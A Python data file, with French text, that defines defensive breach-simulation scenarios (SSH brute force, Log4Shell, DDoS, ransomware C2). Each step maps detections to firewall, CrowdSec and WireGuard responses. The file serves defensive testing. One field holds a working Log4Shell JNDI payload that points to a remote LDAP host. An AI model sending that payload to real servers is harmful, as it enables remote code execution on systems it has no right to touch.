"""
scenario.py — Scénarios d'attaque pour breach-sim.

Chaque scénario contient une liste d'étapes CAP v1 envoyées aux agents ONNX.
"""

from typing import TypedDict

SCENARIOS: dict = {

    # ── 1. SSH Brute Force ────────────────────────────────────────────────────
    "ssh_brute_force": {
        "id": "ssh_brute_force",
        "title": "SSH Brute Force",
        "description": "847 tentatives de connexion SSH en 60s — détection, ban CrowdSec, blocage firewall, rotation VPN.",
        "tags": ["ssh", "brute-force", "crowdsec", "opnsense", "wireguard"],
        "steps": [
            {
                "id": "step_1",
                "title": "Brute-force SSH détecté",
                "agent": "crowdsec",
                "description": "847 tentatives de connexion SSH en 60s depuis 185.220.101.47",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-cs"],
                "topology_event": "crowdsec_ban",
                "mitre": {"tactic": "Credential Access", "technique": "T1110", "name": "Brute Force", "cve": None},
                "cap": {
                    "directive": "add_decision",
                    "entities": {"IP_ADDRESS": ["185.220.101.47"], "PORT_NUMBER": ["22"], "HOSTNAME": []},
                    "context": {"source": "siem", "reason": "brute_force_ssh", "confidence": 0.97, "attempts": 847, "timewindow": "60s"},
                },
            },
            {
                "id": "step_2",
                "title": "IP toujours active — blocage firewall",
                "agent": "opnsense",
                "description": "L'IP contourne le bouncer CrowdSec — blocage au niveau firewall",
                "attack_edges": ["e-atk-net", "e-net-fw"],
                "topology_event": "firewall_block",
                "mitre": {"tactic": "Defense Evasion", "technique": "T1562.004", "name": "Disable or Modify System Firewall", "cve": None},
                "cap": {
                    "directive": "block_ip",
                    "entities": {"IP_ADDRESS": ["185.220.101.47"], "INTERFACE": ["wan"], "PORT_NUMBER": [], "HOSTNAME": [], "IP_SUBNET": []},
                    "context": {"source": "crowdsec", "reason": "ban_evasion", "confidence": 0.95, "previous_action": "add_decision"},
                },
            },
            {
                "id": "step_3",
                "title": "Scan de ports détecté",
                "agent": "opnsense",
                "description": "Scan SYN stealth sur les ports 1-1024 depuis 185.220.101.0/24",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-dmz"],
                "topology_event": "filter_rule_added",
                "mitre": {"tactic": "Discovery", "technique": "T1046", "name": "Network Service Discovery", "cve": None},
                "cap": {
                    "directive": "add_filter_rule",
                    "entities": {"IP_ADDRESS": ["185.220.101.47"], "INTERFACE": ["wan"], "PORT_NUMBER": ["1-1024"], "HOSTNAME": [], "IP_SUBNET": ["185.220.101.0/24"]},
                    "context": {"source": "ids", "reason": "port_scan", "confidence": 0.88, "scan_type": "syn_stealth"},
                },
            },
            {
                "id": "step_4",
                "title": "Rotation des clés VPN",
                "agent": "wireguard",
                "description": "Pivot VPN détecté — rotation préventive des clés WireGuard",
                "attack_edges": ["e-fw-wg"],
                "topology_event": "wireguard_rotate",
                "mitre": {"tactic": "Command and Control", "technique": "T1572", "name": "Protocol Tunneling", "cve": None},
                "cap": {
                    "directive": "generate_wireguard_keypair",
                    "entities": {"HOSTNAME": ["vpn.lan"], "IP_ADDRESS": [], "IP_SUBNET": []},
                    "context": {"source": "opnsense", "reason": "vpn_pivot_detected", "confidence": 0.84, "trigger": "port_scan_subnet"},
                },
            },
        ],
    },

    # ── 2. Log4Shell ──────────────────────────────────────────────────────────
    "log4shell": {
        "id": "log4shell",
        "title": "Log4Shell (CVE-2021-44228)",
        "description": "Exploitation JNDI:ldap détectée — ban CrowdSec, blocage IP, filtrage callback LDAP/RMI, rotation VPN.",
        "tags": ["log4shell", "rce", "jndi", "crowdsec", "opnsense", "wireguard"],
        "steps": [
            {
                "id": "step_1",
                "title": "Scan Log4Shell détecté",
                "agent": "crowdsec",
                "description": "Payload JNDI:ldap:// dans User-Agent depuis 91.92.251.103 — exploitation CVE-2021-44228",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-cs"],
                "topology_event": "crowdsec_ban",
                "mitre": {"tactic": "Initial Access", "technique": "T1190", "name": "Exploit Public-Facing Application", "cve": "CVE-2021-44228"},
                "cap": {
                    "directive": "add_decision",
                    "entities": {"IP_ADDRESS": ["91.92.251.103"], "PORT_NUMBER": ["443"], "HOSTNAME": ["srv-web.lan"]},
                    "context": {"source": "waf", "reason": "log4shell_jndi_payload", "confidence": 0.99, "payload": "${jndi:ldap://91.92.251.103:1389/exploit}", "timewindow": "5s"},
                },
            },
            {
                "id": "step_2",
                "title": "Blocage firewall immédiat",
                "agent": "opnsense",
                "description": "Blocage de l'IP attaquante sur WAN — toute connexion entrante bloquée",
                "attack_edges": ["e-atk-net", "e-net-fw"],
                "topology_event": "firewall_block",
                "mitre": {"tactic": "Initial Access", "technique": "T1190", "name": "Exploit Public-Facing Application", "cve": "CVE-2021-44228"},
                "cap": {
                    "directive": "block_ip",
                    "entities": {"IP_ADDRESS": ["91.92.251.103"], "INTERFACE": ["wan"], "PORT_NUMBER": [], "HOSTNAME": [], "IP_SUBNET": []},
                    "context": {"source": "crowdsec", "reason": "log4shell_attacker", "confidence": 0.99, "cve": "CVE-2021-44228"},
                },
            },
            {
                "id": "step_3",
                "title": "Filtrage callback LDAP/RMI sortant",
                "agent": "opnsense",
                "description": "Blocage des ports de callback exploités par Log4Shell (LDAP 1389, RMI 1099) en sortie",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-dmz"],
                "topology_event": "filter_rule_added",
                "mitre": {"tactic": "Execution", "technique": "T1203", "name": "Exploitation for Client Execution", "cve": "CVE-2021-44228"},
                "cap": {
                    "directive": "add_filter_rule",
                    "entities": {"IP_ADDRESS": [], "INTERFACE": ["lan"], "PORT_NUMBER": ["1389", "1099", "389"], "HOSTNAME": [], "IP_SUBNET": ["0.0.0.0/0"]},
                    "context": {"source": "threat_intel", "reason": "block_ldap_rmi_callback", "confidence": 0.97, "direction": "outbound"},
                },
            },
            {
                "id": "step_4",
                "title": "Rotation préventive des clés VPN",
                "agent": "wireguard",
                "description": "Log4Shell peut exposer les secrets — rotation des clés WireGuard par précaution",
                "attack_edges": ["e-fw-wg"],
                "topology_event": "wireguard_rotate",
                "mitre": {"tactic": "Credential Access", "technique": "T1552", "name": "Unsecured Credentials", "cve": None},
                "cap": {
                    "directive": "generate_wireguard_keypair",
                    "entities": {"HOSTNAME": ["vpn.lan"], "IP_ADDRESS": [], "IP_SUBNET": []},
                    "context": {"source": "soc", "reason": "rce_credential_exposure_risk", "confidence": 0.91, "trigger": "log4shell_rce"},
                },
            },
        ],
    },

    # ── 3. DDoS UDP Flood ─────────────────────────────────────────────────────
    "ddos_udp": {
        "id": "ddos_udp",
        "title": "DDoS UDP Flood",
        "description": "Flood UDP en amplification NTP/DNS depuis 45.95.147.0/24 — ban subnet, règle rate-limit, blocage coordinateur, tunnel mgmt.",
        "tags": ["ddos", "udp", "amplification", "crowdsec", "opnsense", "wireguard"],
        "steps": [
            {
                "id": "step_1",
                "title": "Flood UDP détecté",
                "agent": "crowdsec",
                "description": "18 Gbps UDP en amplification NTP/DNS depuis 45.95.147.0/24 — saturation liaison WAN",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-cs"],
                "topology_event": "crowdsec_ban",
                "mitre": {"tactic": "Impact", "technique": "T1498.002", "name": "Reflection Amplification", "cve": None},
                "cap": {
                    "directive": "add_decision",
                    "entities": {"IP_ADDRESS": ["45.95.147.88"], "PORT_NUMBER": ["123", "53"], "HOSTNAME": []},
                    "context": {"source": "netflow", "reason": "udp_flood_amplification", "confidence": 0.96, "bandwidth_gbps": 18, "pps": 4200000, "protocol": "UDP/NTP+DNS"},
                },
            },
            {
                "id": "step_2",
                "title": "Règle rate-limit UDP WAN",
                "agent": "opnsense",
                "description": "Rate-limit agressif UDP entrant sur WAN — ports NTP 123, DNS 53, Chargen 19",
                "attack_edges": ["e-atk-net", "e-net-fw"],
                "topology_event": "firewall_block",
                "mitre": {"tactic": "Impact", "technique": "T1498", "name": "Network Denial of Service", "cve": None},
                "cap": {
                    "directive": "add_filter_rule",
                    "entities": {"IP_ADDRESS": [], "INTERFACE": ["wan"], "PORT_NUMBER": ["123", "53", "19"], "HOSTNAME": [], "IP_SUBNET": ["45.95.147.0/24"]},
                    "context": {"source": "crowdsec", "reason": "rate_limit_udp_amplification", "confidence": 0.95, "action": "rate_limit", "max_pps": 1000},
                },
            },
            {
                "id": "step_3",
                "title": "Blocage subnet coordinateur DDoS",
                "agent": "opnsense",
                "description": "Blocage complet du subnet 45.95.147.0/24 identifié comme coordinateur de l'attaque",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-dmz"],
                "topology_event": "filter_rule_added",
                "mitre": {"tactic": "Impact", "technique": "T1498.002", "name": "Reflection Amplification", "cve": None},
                "cap": {
                    "directive": "block_ip",
                    "entities": {"IP_ADDRESS": ["45.95.147.88"], "INTERFACE": ["wan"], "PORT_NUMBER": [], "HOSTNAME": [], "IP_SUBNET": ["45.95.147.0/24"]},
                    "context": {"source": "threat_intel", "reason": "ddos_coordinator_subnet", "confidence": 0.93, "block_subnet": True},
                },
            },
            {
                "id": "step_4",
                "title": "Tunnel de management hors-bande",
                "agent": "wireguard",
                "description": "Création d'un tunnel WireGuard out-of-band pour maintenir l'accès admin pendant l'attaque",
                "attack_edges": ["e-fw-wg"],
                "topology_event": "wireguard_client",
                "mitre": {"tactic": "Command and Control", "technique": "T1572", "name": "Protocol Tunneling", "cve": None},
                "cap": {
                    "directive": "add_wireguard_client",
                    "entities": {"HOSTNAME": ["admin.oob.lan"], "IP_ADDRESS": ["10.0.0.2"], "IP_SUBNET": ["10.0.0.0/24"]},
                    "context": {"source": "soc", "reason": "oob_management_during_ddos", "confidence": 0.98, "trigger": "ddos_attack_ongoing"},
                },
            },
        ],
    },

    # ── 4. Ransomware C2 ──────────────────────────────────────────────────────
    "ransomware_c2": {
        "id": "ransomware_c2",
        "title": "Ransomware C2 Beacon",
        "description": "Beacon C2 sortant détecté sur un poste — coupure C2, blocage lateral movement SMB/RDP, isolation VPN.",
        "tags": ["ransomware", "c2", "lateral-movement", "crowdsec", "opnsense", "wireguard"],
        "steps": [
            {
                "id": "step_1",
                "title": "Beacon C2 détecté",
                "agent": "crowdsec",
                "description": "Communication C2 sortante vers 194.165.16.72:443 (Cobalt Strike) depuis 192.168.2.15",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-cs"],
                "topology_event": "crowdsec_ban",
                "mitre": {"tactic": "Command and Control", "technique": "T1071.001", "name": "Web Protocols", "cve": None},
                "cap": {
                    "directive": "add_decision",
                    "entities": {"IP_ADDRESS": ["194.165.16.72"], "PORT_NUMBER": ["443"], "HOSTNAME": ["c2.evil.net"]},
                    "context": {"source": "edr", "reason": "c2_beacon_cobalt_strike", "confidence": 0.98, "infected_host": "192.168.2.15", "beacon_interval": "60s"},
                },
            },
            {
                "id": "step_2",
                "title": "Blocage egress C2",
                "agent": "opnsense",
                "description": "Blocage du trafic sortant vers l'IP C2 sur toutes les interfaces",
                "attack_edges": ["e-atk-net", "e-net-fw"],
                "topology_event": "firewall_block",
                "mitre": {"tactic": "Command and Control", "technique": "T1071", "name": "Application Layer Protocol", "cve": None},
                "cap": {
                    "directive": "block_ip",
                    "entities": {"IP_ADDRESS": ["194.165.16.72"], "INTERFACE": ["wan"], "PORT_NUMBER": [], "HOSTNAME": [], "IP_SUBNET": []},
                    "context": {"source": "crowdsec", "reason": "c2_egress_block", "confidence": 0.98, "direction": "outbound"},
                },
            },
            {
                "id": "step_3",
                "title": "Blocage lateral movement SMB/RDP",
                "agent": "opnsense",
                "description": "Blocage des ports de propagation ransomware sur le segment LAN (SMB 445, RDP 3389, WMI 135)",
                "attack_edges": ["e-atk-net", "e-net-fw", "e-fw-dmz"],
                "topology_event": "filter_rule_added",
                "mitre": {"tactic": "Lateral Movement", "technique": "T1021", "name": "Remote Services", "cve": None},
                "cap": {
                    "directive": "add_filter_rule",
                    "entities": {"IP_ADDRESS": ["192.168.2.15"], "INTERFACE": ["lan"], "PORT_NUMBER": ["445", "3389", "135"], "HOSTNAME": [], "IP_SUBNET": ["192.168.2.0/24"]},
                    "context": {"source": "edr", "reason": "block_ransomware_lateral_movement", "confidence": 0.96, "smb_connections": 47, "rdp_attempts": 12},
                },
            },
            {
                "id": "step_4",
                "title": "Isolation du poste compromis",
                "agent": "wireguard",
                "description": "Création d'un tunnel WireGuard pour isoler 192.168.2.15 et maintenir l'accès forensic",
                "attack_edges": ["e-fw-wg"],
                "topology_event": "wireguard_client",
                "mitre": {"tactic": "Lateral Movement", "technique": "T1021.005", "name": "VNC", "cve": None},
                "cap": {
                    "directive": "add_wireguard_client",
                    "entities": {"HOSTNAME": ["quarantine.lan"], "IP_ADDRESS": ["10.0.99.15"], "IP_SUBNET": ["10.0.99.0/24"]},
                    "context": {"source": "soc", "reason": "quarantine_infected_host", "confidence": 0.97, "infected_host": "192.168.2.15", "trigger": "ransomware_c2_detected"},
                },
            },
        ],
    },
}

# Liste ordonnée pour l'affichage
SCENARIO_ORDER = ["ssh_brute_force", "log4shell", "ddos_udp", "ransomware_c2"]
